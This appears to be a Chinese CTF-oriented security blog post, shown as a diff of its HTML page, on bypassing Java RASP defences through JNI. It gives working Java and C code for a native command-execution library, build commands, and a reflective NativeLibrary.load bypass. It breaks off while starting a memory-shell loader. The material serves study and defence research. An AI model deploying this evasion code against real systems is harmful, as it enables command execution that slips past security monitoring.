@@ -1,0 +1,1628 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="baidu-site-verification" content="codeva-saNLerbgqp" />
+    <meta name="keywords" content="Java安全--JNI绕过RASP, 清风的博客">
+    <meta name="description" content="Java安全–JNI绕过RASP前言绕过RASP在Java题目中已经给薄纱好多次了，这次遇到了题目好好看看
+JNI介绍JNI（Java Native Interface），其作用是让Java程序去调用C的程序，相当于Java和C的通道。在初">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Java安全--JNI绕过RASP | 清风的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">清风的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-friends" style="zoom: 0.6;"></i>
+      
+      <span>友人铺</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">清风的博客</div>
+        <div class="logo-desc">
+            
+            勤奋总有回报
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-friends"></i>
+			
+			友人铺
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Java安全--JNI绕过RASP</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/" class="post-category">
+                                未分类
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-11-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-11-23
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    13 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Java安全–JNI绕过RASP"><a href="#Java安全–JNI绕过RASP" class="headerlink" title="Java安全–JNI绕过RASP"></a>Java安全–JNI绕过RASP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>绕过RASP在Java题目中已经给薄纱好多次了，这次遇到了题目好好看看</p>
+<h2 id="JNI介绍"><a href="#JNI介绍" class="headerlink" title="JNI介绍"></a>JNI介绍</h2><p>JNI（Java Native Interface），其作用是让Java程序去调用C的程序，相当于Java和C的通道。在初学C语言的理解中C执行程序是把C语言编译成exe或ELF可执行文件然后调用可执行文件执行相关程序，但是这里的JNI是通过调用C包装的DLL动态链接库封装的方法去执行的，Java本身就是基于C实现的，所以Java底层也会教频繁地调用JNI。其实就是调用Native代码（用C语言实现的方法）。</p>
+<p>借用（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14067160.html">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a>）的一张图</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123120715-a07ge5i.png" alt="image">​</p>
+<p>以下实验使用jdk8u65实现，JDK10后的高版本似乎删去了javah</p>
+<p>我这里利用javah编译<code>.h</code>​文件</p>
+<p>首先我们需要一个native修饰的java文件：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">nativeMethod</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        Test test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        test<span class="token punctuation">.</span><span class="token function">nativeMethod</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>使用<code>javac Test.java</code>​编译文件</p>
+<p>使用<code>javah -jni Test</code>​编译生成.h文件</p>
+<p>javah工具用于生成与JNI相关的C头文件，这个头文件可以用于在本地代码中实现Java类的本地方法。</p>
+<p>三个文件如图所示：</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123123353-zbcwcpp.png" alt="image">​</p>
+<p>Test.h:</p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span>
+<span class="token comment" spellcheck="true">/* Header for class Test */</span>
+
+<span class="token macro property">#<span class="token directive keyword">ifndef</span> _Included_Test</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> _Included_Test</span>
+<span class="token macro property">#<span class="token directive keyword">ifdef</span> __cplusplus</span>
+<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">{</span>
+<span class="token macro property">#<span class="token directive keyword">endif</span></span>
+<span class="token comment" spellcheck="true">/*
+ * Class:     Test
+ * Method:    nativeMethod
+ * Signature: (Ljava/lang/String;)V
+ */</span>
+JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_Test_nativeMethod</span>
+  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span><span class="token punctuation">,</span> jobject<span class="token punctuation">,</span> jstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token macro property">#<span class="token directive keyword">ifdef</span> __cplusplus</span>
+<span class="token punctuation">}</span>
+<span class="token macro property">#<span class="token directive keyword">endif</span></span>
+<span class="token macro property">#<span class="token directive keyword">endif</span></span>
+</code></pre>
+<p>‍</p>
+<p>然后我们编写一个calc.c用于调用这个Test.h</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"Test.h"</span></span>
+
+JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_Test_nativeMethod</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jstring command<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> command<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取命令失败，直接返回</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Executing command: %s\n"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 执行命令</span>
+
+    <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">ReleaseStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> command<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 释放内存</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Win执行:</p>
+<pre class=" language-cmd"><code class="language-cmd">gcc -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32" -shared -o libcmd.dll calc.c
+</code></pre>
+<p>Linux执行</p>
+<pre class=" language-shell"><code class="language-shell">gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so calc.c
+</code></pre>
+<p>添加一个加载dll或者so文件</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">nativeMethod</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\Downloads\\bypassJava\\Test\\libcmd.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Test test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        test<span class="token punctuation">.</span><span class="token function">nativeMethod</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>使用javac Test.java编译后</p>
+<p>运行java Test弹出计算器：</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123124231-6nyf3ls.png" alt="image">​</p>
+<p>‍</p>
+<p>步骤可以归纳为如下的五步：</p>
+<ol>
+<li>编写一个 java 文件，其中定义一个 native 方法，然后使用 javac 编译得到 .class 文件</li>
+<li>使用 javah 进行对 .class 文件进行处理，得到编写 C 代码所需的头文件。</li>
+<li>编写命令执行的 C 语言实现</li>
+<li>将编写的 C 代码编译为 lib 或者 dll（注意jdk版本要与目标机器的jdk保持一致,经过测试大版本一致即可）</li>
+<li>编写一个 Java 类调用 System.loadLibrary 方法加载 dll 文件。</li>
+</ol>
+<p>‍</p>
+<h2 id="RASP介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h2><p>RASP（Run­time Ap­pli­ca­tion Self-Pro­tec­tion），实时程序自我保护。RASP可以监控实时危险方法调用，实现原理也很底层。Java RASP 通常使用 java agent 技术实现，例github项目地址 <a target="_blank" rel="noopener" href="https://github.com/chaitin/log4j2-vaccine%E3%80%82">https://github.com/chaitin/log4j2-vaccine。</a></p>
+<p>实现主要通过Hook掉了一些<code>恶意类</code>​​，比如<code>Runtime</code>​​、<code>ProcessBuilder</code>​​。<code>Runtime.exec</code>​​调用的是<code>ProcessBuilder.start</code>​​,<code>ProcessBuilder.start</code>​​的底层会调用<code>ProcessImpl</code>​​类。那么这时候只需要去Hook掉<code>ProcessImpl</code>​​就无法进行执行命令了。</p>
+<p>‍</p>
+<h2 id="绕过RASP"><a href="#绕过RASP" class="headerlink" title="绕过RASP"></a>绕过RASP</h2><h3 id="system-load"><a href="#system-load" class="headerlink" title="system.load"></a>system.load</h3><p>像上面JNI中利用的方法是<code>system.load</code>​来加载dll或者so文件的，以此可以绕过ProcessImpl类被Hook的情况</p>
+<h3 id="反射NativeLibrary"><a href="#反射NativeLibrary" class="headerlink" title="反射NativeLibrary"></a>反射NativeLibrary</h3><p>如果类<code>loadLibrary0</code>​也被Hook了，那么是无法使用<code>system.load</code>​来绕过的</p>
+<p>讨论一种新的方法：反射调用 <code>java.lang.ClassLoader.NativeLibrary</code>​ 中的 <code>load</code>​ 方法来加载恶意so文件执行命令</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>System.load下面是利用load0来加载的</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212232-ck8vo4r.png" alt="image">​</p>
+<p>跟进load0</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212303-coyrnho.png" alt="image">​</p>
+<p>跟进更底层方法loadLibrary</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212329-zwpsii5.png" alt="image">​</p>
+<p>发现还有一个更底层的loadLibrary0，而且loadLibrary0不是最底层的方法</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212416-ek16rzp.png" alt="image">​</p>
+<p>再往下还有一个NativeLibrary，可以看到他也调用了一个loaded</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123212520-44ye9r4.png" alt="image">​</p>
+<p>跟进这个方法发现他有一个load方法，所以从这里开始反射调用恶意的so文件</p>
+<p>java恶意类</p>
+<p>EvilClass.java:</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span>  <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">execCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>编译：</p>
+<pre class=" language-cmd"><code class="language-cmd">javac EvilClass.java
+javah EvilClass
+</code></pre>
+<p>编写C文件：</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"EvilClass.h"</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">execmd</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//定义缓冲区</span>
+    FILE <span class="token operator">*</span>pipe <span class="token operator">=</span> <span class="token function">_popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打开管道，并执行命令</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pipe<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回0表示运行失败</span>
+
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> pipe<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//将管道输出到result中</span>
+            <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">_pclose</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭管道</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//返回1表示运行成功</span>
+<span class="token punctuation">}</span>
+JNIEXPORT jstring JNICALL <span class="token function">Java_com_test_Command_exec</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject class_object<span class="token punctuation">,</span> jstring jstr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+
+    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cstr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetStringUTFChars</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> jstr<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义存放结果的字符串数组</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token function">execmd</span><span class="token punctuation">(</span>cstr<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+       <span class="token comment" spellcheck="true">// printf(result);</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">char</span> return_messge<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token function">strcat</span><span class="token punctuation">(</span>return_messge<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    jstring cmdresult <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewStringUTF</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> return_messge<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//system();</span>
+
+    <span class="token keyword">return</span> cmdresult<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>接下来就是编译了：</p>
+<p>win:</p>
+<pre class=" language-cmd"><code class="language-cmd">gcc -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32" -shared -o libcmd.dll Evil.c
+</code></pre>
+<p>linux:</p>
+<pre class=" language-shell"><code class="language-shell">gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so Evil.c
+</code></pre>
+<p>然后就是获取一下这个文件的base64的值，把他和内存马放一起：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span>
